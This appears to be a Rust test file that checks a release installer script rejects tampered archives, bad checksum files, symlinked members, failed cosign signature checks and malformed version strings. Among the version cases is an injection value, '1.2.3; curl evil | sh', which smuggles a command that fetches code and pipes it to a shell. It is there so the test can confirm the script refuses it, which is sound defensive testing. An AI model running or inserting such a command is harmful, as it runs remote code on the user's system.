//! `action/install.sh`: what a pinned release must prove before the binary lands on
//! a runner. The fixture is a release built the way release.yml builds one — same
//! archive name, same `keepshipping-<version>/` layout, same `<hex>  <name>`
//! SHA256SUMS — served over `file://`, so nothing touches a network. Every refusal has
//! to be a non-zero exit with nothing installed.

use std::path::{Path, PathBuf};
use std::process::{Command, Output};

/// Not a real release: the fixture builds whatever the script asks for.
const VERSION: &str = "9.9.9";
/// The repository whose release workflow install.sh trusts: hard-coded in the script
/// and asserted here against the same string, so changing what is trusted changes both.
const REPO: &str = "Keep-Shipping/harness";

/// The tools install.sh shells out to, and nothing else, so a real `cosign` on the
/// machine cannot decide a case and "cosign is missing" is arranged by leaving a name
/// out. `xz` is here because `tar -J` execs it as a compressor; without it the shim PATH
/// cannot unpack the Linux `.tar.xz` release, which is not what these cases are about.
const TOOLS: &str = "bash curl tar xz mktemp rm mkdir cp mv chmod uname sha256sum shasum cut awk";
fn script() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../../action/install.sh")
}

fn have(program: &str) -> bool {
    Command::new("bash")
        .arg("-c")
        .arg(format!("command -v {program}"))
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok_and(|s| s.success())
}

fn write(path: &Path, bytes: &[u8]) {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).expect("create the parent directory");
    }
    std::fs::write(path, bytes).expect("write the fixture file");
}

fn stdout(out: &Output) -> String {
    String::from_utf8_lossy(&out.stdout).into_owned()
}

fn stderr(out: &Output) -> String {
    String::from_utf8_lossy(&out.stderr).into_owned()
}

/// Both streams of a run, so a failed assertion can show what the script said.
fn said(out: &Output) -> String {
    format!("stdout:\n{}\nstderr:\n{}", stdout(out), stderr(out))
}

/// A scratch directory under the target dir, emptied first so a re-run sees no leftovers.
fn scratch(name: &str) -> PathBuf {
    let dir = Path::new(env!("CARGO_TARGET_TMPDIR"))
        .join(format!("action-install-{}-{name}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).expect("create the scratch directory");
    dir
}

/// The release triple and archive format this machine is, as release.yml spells them:
/// `tar.gz` on macOS, `tar.xz` on Linux. `None` means nothing ships here.
fn release_target() -> Option<(String, String)> {
    let uname = |flag: &str| {
        let out = Command::new("uname").arg(flag).output().expect("run uname");
        String::from_utf8_lossy(&out.stdout).trim().to_string()
    };
    match (uname("-s").as_str(), uname("-m").as_str()) {
        ("Darwin", "arm64" | "aarch64") => Some(("aarch64-apple-darwin".into(), "tar.gz".into())),
        ("Darwin", "x86_64" | "amd64") => Some(("x86_64-apple-darwin".into(), "tar.gz".into())),
        ("Linux", "aarch64" | "arm64") => {
            Some(("aarch64-unknown-linux-gnu".into(), "tar.xz".into()))
        }
        ("Linux", "x86_64" | "amd64") => Some(("x86_64-unknown-linux-gnu".into(), "tar.xz".into())),
        _ => None,
    }
}

/// Run install.sh with a scrubbed environment: a laptop may have GITHUB_PATH,
/// RUNNER_TOOL_CACHE or GH_TOKEN set, and what is installed and where must come from
/// what the case passes. TMPDIR stays inside the scratch directory. `cosign_exit` is what
/// the fake cosign returns: 0 accepts the bundle, 1 refuses it.
fn run_in(dir: &Path, path: &Path, version: &str, verify: &str, cosign_exit: i32) -> Output {
    Command::new("bash")
        .arg(script())
        .env_clear()
        .env("PATH", path)
        .env("HOME", dir)
        .env("TMPDIR", dir.join("tmp"))
        .env("KS_VERSION", version)
        .env("KS_BASE_URL", format!("file://{}", dir.display()))
        .env("KS_INSTALL_DIR", dir.join("bin"))
        .env("KS_VERIFY_SIGNATURE", verify)
        .env("KS_COSIGN_EXIT", cosign_exit.to_string())
        .output()
        .expect("run install.sh")
}

/// A fake release: one archive, a SHA256SUMS that names it, a placeholder bundle, and a
/// TMPDIR inside the scratch directory.
struct Release {
    dir: PathBuf,
    target: String,
    ext: String,
    archive: String,
}

impl Release {
    /// Build one, or `None` when this machine cannot run the cases: unix, the tools
    /// install.sh needs, a sha256 tool, and an `uname` the release matrix builds for.
    fn new(name: &str) -> Option<Self> {
        if !(["bash", "tar", "curl", "uname"].iter().all(|p| have(p))
            && (have("sha256sum") || have("shasum")))
        {
            eprintln!("skipping: install.sh needs a unix shell, tar, curl and a sha256 tool");
            return None;
        }
        let (target, ext) = release_target()?;
        let dir = scratch(name);
        let archive = format!("keepshipping-{VERSION}-{target}.{ext}");
        let r = Release { dir, target, ext, archive };
        // release.yml stages the binary next to LICENSE and README.md (ADR 0006). The
        // fixture matches that layout rather than the minimum the script needs, and the
        // stub prints its own version so a case can tell it from a truncated member.
        let pkg = r.pkg();
        let stub = format!("#!/bin/sh\necho \"stub keepshipping {VERSION}\"\n");
        write(&pkg.join("keepshipping"), stub.as_bytes());
        write(&pkg.join("LICENSE"), b"Apache-2.0\n");
        write(&pkg.join("README.md"), b"# keepshipping\n");
        r.pack();
        r.sums(&format!("{}  {}\n", r.sha256(), r.archive));
        write(&r.dir.join("SHA256SUMS.bundle"), b"not a real bundle\n");
        std::fs::create_dir_all(r.dir.join("tmp")).expect("create the TMPDIR");
        Some(r)
    }

    fn path(&self, name: &str) -> PathBuf {
        self.dir.join(name)
    }

    /// The `keepshipping-<version>/` tree a release is staged into.
    fn pkg(&self) -> PathBuf {
        let pkg = self.path(&format!("stage/keepshipping-{VERSION}"));
        std::fs::create_dir_all(&pkg).expect("stage the package");
        pkg
    }

    /// Tar the stage directory, as release.yml does: `-czf` for macOS, `-cJf` for Linux
    /// (`xz` is a compressor, not an operation). Re-run by the cases that change the payload.
    fn pack(&self) {
        let archive = self.path(&self.archive);
        let _ = std::fs::remove_file(&archive);
        let create = if self.ext == "tar.gz" { "-czf" } else { "-cJf" };
        let out = Command::new("tar")
            .arg("-C")
            .arg(self.dir.join("stage"))
            .arg(create)
            .arg(&archive)
            .arg(format!("keepshipping-{VERSION}"))
            .output()
            .expect("run tar");
        assert!(out.status.success(), "tar failed: {}", String::from_utf8_lossy(&out.stderr));
    }

    /// An archive that no longer hashes to what SHA256SUMS says, with SHA256SUMS left
    /// alone. It still unpacks, so a script that unpacked first would say nothing wrong.
    fn tamper(&self) {
        let path = self.path(&self.archive);
        let mut bytes = std::fs::read(&path).expect("read the archive");
        bytes.push(0);
        std::fs::write(path, bytes).expect("tamper with the archive");
    }

    /// A member that is a symlink to LICENSE, which travels with it in the same release,
    /// then re-signed so the checksum still matches: a correctly-checksummed release whose
    /// only defect is the symlink. The target is a real file because install.sh tests
    /// `[ -f ]` before `[ -L ]`; a dangling link would pass for the wrong reason.
    fn symlink_member(&self) {
        let binary = self.pkg().join("keepshipping");
        let _ = std::fs::remove_file(&binary);
        #[cfg(unix)]
        std::os::unix::fs::symlink("LICENSE", &binary).expect("make the member a symlink");
        self.pack();
        self.sums(&format!("{}  {}\n", self.sha256(), self.archive));
    }

    fn sha256(&self) -> String {
        let archive = self.path(&self.archive);
        let out = if have("sha256sum") {
            Command::new("sha256sum").arg(archive).output()
        } else {
            Command::new("shasum").args(["-a", "256"]).arg(archive).output()
        }
        .expect("run a sha256 tool");
        stdout(&out).split_whitespace().next().expect("a digest").to_string()
    }

    fn sums(&self, body: &str) {
        write(&self.path("SHA256SUMS"), body.as_bytes());
    }

    fn installed(&self) -> PathBuf {
        self.path("bin/keepshipping")
    }

    /// A directory holding a symlink to each tool that exists here, plus a fake `cosign`
    /// recording its own argv one argument per line, so a case can assert on the exact
    /// certificate identity it was asked to trust.
    fn shim_path(&self, cosign: bool) -> PathBuf {
        let bin = self.path("shim-path");
        let _ = std::fs::remove_dir_all(&bin);
        std::fs::create_dir_all(&bin).expect("create the shim PATH");
        let real = std::env::var_os("PATH").unwrap_or_default();
        for tool in TOOLS.split_whitespace() {
            let found = Command::new("bash")
                .arg("-c")
                .arg(format!("command -v {tool}"))
                .env("PATH", &real)
                .output()
                .ok()
                .filter(|o| o.status.success())
                .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
                .unwrap_or_default();
            if !found.is_empty() {
                let _ = std::os::unix::fs::symlink(found, bin.join(tool));
            }
        }
        if cosign {
            use std::os::unix::fs::PermissionsExt as _;
            let argv = self.path("cosign-argv");
            let shim = bin.join("cosign");
            write(
                &shim,
                format!(
                    "#!/bin/sh\nprintf '%s\\n' \"$@\" > '{}'\nexit \"${{KS_COSIGN_EXIT:-0}}\"\n",
                    argv.display()
                )
                .as_bytes(),
            );
            std::fs::set_permissions(&shim, std::fs::Permissions::from_mode(0o755))
                .expect("chmod the shim");
        }
        bin
    }

    fn install(&self, verify: &str, cosign: bool, cosign_exit: i32) -> Output {
        run_in(&self.dir, &self.shim_path(cosign), VERSION, verify, cosign_exit)
    }
}

#[test]
fn a_verified_release_installs_and_runs() {
    let Some(fixture) = Release::new("happy") else { return };
    let out = fixture.install("false", false, 0);
    assert_eq!(out.status.code(), Some(0), "{}", said(&out));
    assert!(stderr(&out).is_empty(), "the script wrote to stderr: {}", said(&out));
    // What was verified is said out loud, not merely implied by exit 0.
    assert!(stdout(&out).contains(&fixture.target), "{}", said(&out));
    assert!(stdout(&out).contains("matches SHA256SUMS"), "{}", said(&out));
    assert!(stdout(&out).contains("NOT verified"), "{}", said(&out));
    let installed = fixture.installed();
    assert!(installed.is_file(), "nothing installed at {}", installed.display());
    let ran = Command::new(&installed).output().expect("run the installed binary");
    assert!(ran.status.success(), "the installed binary did not run");
    assert!(
        stdout(&ran).contains(&format!("keepshipping {VERSION}")),
        "not the binary from {}",
        fixture.archive
    );
    let _ = std::fs::remove_dir_all(&fixture.dir);
}

#[test]
fn the_release_workflow_signature_is_what_cosign_is_asked_to_trust() {
    let Some(fixture) = Release::new("cosign") else { return };
    let out = fixture.install("true", true, 0);
    assert_eq!(out.status.code(), Some(0), "{}", said(&out));
    assert!(stdout(&out).contains("cosign keyless"), "{}", said(&out));
    assert!(fixture.installed().is_file(), "nothing was installed");
    let argv =
        std::fs::read_to_string(fixture.path("cosign-argv")).expect("the shim recorded its argv");
    let arg = |flag: &str| -> String {
        argv.lines()
            .skip_while(|a| *a != flag)
            .nth(1)
            .unwrap_or_else(|| panic!("cosign was not asked for {flag}: {argv}"))
            .to_string()
    };
    assert!(argv.starts_with("verify-blob\n"), "cosign ran something else: {argv}");
    assert_eq!(
        arg("--certificate-identity"),
        format!("https://github.com/{REPO}/.github/workflows/release.yml@refs/tags/v{VERSION}")
    );
    assert_eq!(arg("--certificate-oidc-issuer"), "https://token.actions.githubusercontent.com");
    assert!(
        arg("--bundle").ends_with("SHA256SUMS.bundle"),
        "the bundle verified was not the release's: {argv}"
    );
    let _ = std::fs::remove_dir_all(&fixture.dir);
}

/// One way a release can fail to prove itself, as (name, verify-signature, cosign on
/// PATH, arrangement, what the refusal must say). Each gets its own fixture and is
/// asserted the same way: non-zero exit, a message naming what went wrong, nothing
/// installed. The cosign cases live here too, so every refusal has one shape.
type Case = (&'static str, &'static str, bool, fn(&Release), &'static str);

#[test]
fn a_release_that_fails_a_check_installs_nothing() {
    fn nothing(_: &Release) {}
    let cases: [Case; 6] = [
        (
            "the archive does not match its checksum",
            "false",
            false,
            |r| r.tamper(),
            "checksum mismatch",
        ),
        (
            "the archive is not named in SHA256SUMS",
            "false",
            false,
            |r| {
                r.sums(&format!(
                    "{}  keepshipping-{VERSION}-other-target.{}\n",
                    "0".repeat(64),
                    r.ext
                ))
            },
            "names no",
        ),
        // A release that disagrees with itself about one filename cannot be verified by
        // picking the first line and hoping.
        (
            "the archive is named twice in SHA256SUMS",
            "false",
            false,
            |r| {
                let line = format!("{}  {}\n", r.sha256(), r.archive);
                r.sums(&format!("{line}{line}"))
            },
            "2 times",
        ),
        (
            "the archive holds a symlink where the binary goes",
            "false",
            false,
            |r| r.symlink_member(),
            "is a symlink",
        ),
        // Without this, a typo in the identity the success case asserts would still exit
        // 0 on a real run.
        ("cosign refuses the signature", "true", true, nothing, "cosign could not verify"),
        ("cosign is not installed", "true", false, nothing, "cosign is not on PATH"),
    ];
    for (i, (name, verify, cosign, arrange, marker)) in cases.iter().enumerate() {
        let Some(fixture) = Release::new(&format!("refusal-{i}")) else { return };
        arrange(&fixture);
        let out = fixture.install(verify, *cosign, i32::from(*cosign));
        assert_ne!(out.status.code(), Some(0), "{name} was accepted: {}", said(&out));
        assert!(stderr(&out).contains(marker), "{name} {}", said(&out));
        assert!(!fixture.installed().exists(), "{name} installed a binary anyway: {}", said(&out));
        assert!(!stdout(&out).contains("installed:"), "{name} {}", said(&out));
        let _ = std::fs::remove_dir_all(&fixture.dir);
    }
}

#[test]
fn a_version_that_is_not_a_version_is_refused_by_name() {
    // Only `bash` here, and deliberately: the version check is the first thing
    // install.sh does, so this must fail before it needs a target, `tar` or a release.
    if !(cfg!(unix) && have("bash")) {
        eprintln!("skipping: install.sh needs a unix shell");
        return;
    }
    let dir = scratch("versions");
    let installed = dir.join("bin/keepshipping");
    // (version, what the refusal has to say). `latest` is called out by name: the
    // CI-reproducibility rule is why it is refused, so that is what a user reads.
    let cases = [
        ("", "exact version"),
        ("latest", "latest"),
        ("1.2", "not an exact version"),
        ("v1.2.3", "not an exact version"),
        ("1.2.3; curl evil | sh", "not an exact version"),
        ("1.2.3-..", "not an exact version"),
    ];
    let path = PathBuf::from(std::env::var("PATH").unwrap_or_default());
    for (version, expected) in cases {
        let out = run_in(&dir, &path, version, "false", 0);
        assert_ne!(
            out.status.code(),
            Some(0),
            "KS_VERSION={version:?} was accepted: {}",
            said(&out)
        );
        assert!(stderr(&out).contains(expected), "KS_VERSION={version:?} {}", said(&out));
        assert!(!installed.exists(), "KS_VERSION={version:?} installed anyway");
    }
    let _ = std::fs::remove_dir_all(&dir);
}
